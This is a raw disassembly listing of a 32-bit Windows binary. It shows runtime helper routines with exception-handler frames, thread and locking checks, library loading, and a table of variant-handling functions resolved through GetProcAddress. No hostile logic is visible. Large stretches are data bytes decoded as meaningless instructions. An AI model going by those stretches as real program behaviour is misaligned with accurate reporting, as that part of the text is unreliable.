lea eax [ edi + 0xc ]
call sub_40d288
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d2a8
test eax eax
je r-xdata
mov eax edi
call sub_40d49c
test bl bl
je r-xdata
mov eax edi
call sub_40d4d0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d288
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d294
sub_40d57c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d318
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d2a8
mov eax ebx
call sub_40d4b4
mov eax ebx
call sub_40d4a8
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d390
sub_40d5cc
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d318
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d4c0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d294
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d288
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d4c0
mov eax esi
call sub_40d4b4
sub_40d638
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d318
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d390
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d288
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d4b4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d4b4
sub_40d6b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d6d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d74b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4057e0
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4033f8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d752
lea eax [ ebp - 0x4 ]
call sub_4057e0
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4033f8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d6b0
test al al
jne r-xdata
mov al 0x1
sub_40d76c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d7de
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d7c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404554
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7c7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d869
xor al 0x49
add [ eax + 0x2c004922 ] dl
xor ecx [ ecx ]
mov [ edx ] ah
dec ecx
add [ ebx + esi ] al
dec ecx
add [ eax + 0xc004922 ] al
xor eax 0x22780049
dec ecx
add [ eax + 0x70004934 ] bh
and cl [ ecx ]
adc al 0x32
dec ecx
add [ eax + 0x22 ] ch
dec ecx
add [ eax + 0x60004934 ] al
and cl [ ecx ]
nop
xor al 0x49
add [ eax + 0x22 ] bl
dec ecx
add [ eax + 0x31 ] dl
dec ecx
add [ eax + 0x22 ] dl
dec ecx
add [ eax ] al
xor [ ecx ] ecx
dec eax
and cl [ ecx ]
add [ ebx ] dh
dec ecx
add [ eax + 0x22 ] al
dec ecx
add [ ebx + esi + 0x22380049 ] ch
dec ecx
add [ eax ] bh
xor [ ecx ] cl
xor [ edx ] ah
dec ecx
add [ esp + esi + 0x49 ] dh
add [ eax ] ch
and cl [ ecx ]
adc [ edx ] dh
dec ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
and cl [ ecx ]
push esp
xor al 0x49
add [ eax ] al
add [ eax ] al
add [ edx ] bl
dec ecx
add [ eax + esi + 0x49 ] cl
add [ eax ] al
sbb [ edx ] ah
dec ecx
add [ eax + 0x4933 ] dl
add [ eax ] al
add [ edx ] dl
dec ecx
add [ eax + esi + 0x49 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
and cl [ ecx ]
sbb al 0x31
dec ecx
add [ eax ] al
add [ eax ] al
add [ edx ] cl
dec ecx
add [ ecx + esi ] dl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] cl
and cl [ ecx ]
movsb [ edi ] [ esi ]
xor [ ecx ] cl
add [ eax ] al
add [ eax ] al
add al 0x22
dec ecx
add [ edx + esi ] cl
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
and cl [ ecx ]
sub [ ebx ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add ah bh
and [ ecx ] ecx
sbb [ ecx ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add al bh
and [ ecx ] ecx
clc
xor cl [ ecx ]
add [ eax ] al
add [ eax ] al
hlt
sub_40dc40
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dca8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcaf
retn
mov eax r-xdata
call sub_403e40
mov eax r-xdata
call sub_403e68
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c378
call sub_40c47c
call sub_40d22c
call sub_40cdc4
mov eax rw-data
mov edx r-xdata
call sub_4040e8
sub_40dce0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40dd34
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd8e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40431c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408390
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd95
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40dda0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40ddfa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40431c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409bb4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de01
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40de0c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40de66
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40431c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409b88
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de6d
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40de78
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40ded2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40431c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b428
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ded9
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40dee4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40df3e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40431c
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409be0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df45
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40df50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dfbd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_40431c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_40847c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfc4
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_40dfd0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e030
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409ae4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4048c0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e037
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40e040
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e0a0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40abe8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4048c0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e0a7
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40e0b0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40e114
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408518
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4048c0
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e11b
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_40e144
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e170
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40dce0
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd10
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd10
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd1c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd28
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd34
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dda0
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de0c
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de78
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dee4
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df50
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dfd0
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e040
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e0b0
mov eax r-xdata
call sub_40e144
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e47c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e4a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4a8
retn
sub_40e5dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe6
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add ah bl
xor al [ eax ]
clc
jb r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xe7
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
out 0x40 eax
outsd
jb r-xdata
push eax
out 0x40 eax
inc ebx
popad
jb r-xdata
mov dh ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e6 ] cl
add [ eax ] al
add [ edx + edi * 2 ] al
adc eax 0x72615645
jns r-xdata
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcl [ eax - 0x19 ] 0x40
shr ah 0xe6
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add ah bl
xor al [ eax ]
clc
jb r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
pushfd
xor eax 0x35a00040
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc eax
add [ ebx + esi ] dh
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
jb r-xdata
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
lea eax [ eax ]
and al 0xe6
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xe8
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsd
jb r-xdata
add [ eax ] al
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x19 ] dl
inc eax
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0040 ] dh
inc ebp
jb r-xdata
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
jb r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
jb r-xdata
outsb
je r-xdata
popad
sar [ eax + ebp * 8 + 0x40 ] 0x0
add [ eax ] al
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ 0x72615645 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
call r--data
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
call sub_40e812
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al ch
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
fdiv [ edx ]
outsd
inc eax
add al bh
inc eax
add [ eax + 0x40e9 ] dh
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add ah bl
xor al [ eax ]
clc
insd
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
jb r-xdata
add [ eax ] al
jb r-xdata
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add ah bl
xor al [ eax ]
clc
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ ebx + esi ] dh
outsb
js r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add [ ecx + ebp * 8 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0x40 ] cl
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
jl r-xdata
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax ] bl
0x40 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
0xc0040 0x0
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add ah ah
call sub_40e8de
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eae5
lea eax [ ebp - 0x4 ]
call sub_404094
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40eb77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4107d8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4107d8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb7e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040b8
retn
dec ebp
in al 0x8b
mov ebx eax
popad
jb r-xdata
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
add al 0x7a
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e9 ] dh
add [ eax ] al
add [ edx + edi * 2 ] al
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
outsd
push 0x0
xor eax eax
push ebp
push sub_40eade
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
dec ecx
add al ch
0x40 0x0
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_40e812
inc eax
add [ ebx + esi ] dh
add ah bl
xor al [ eax ]
clc
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
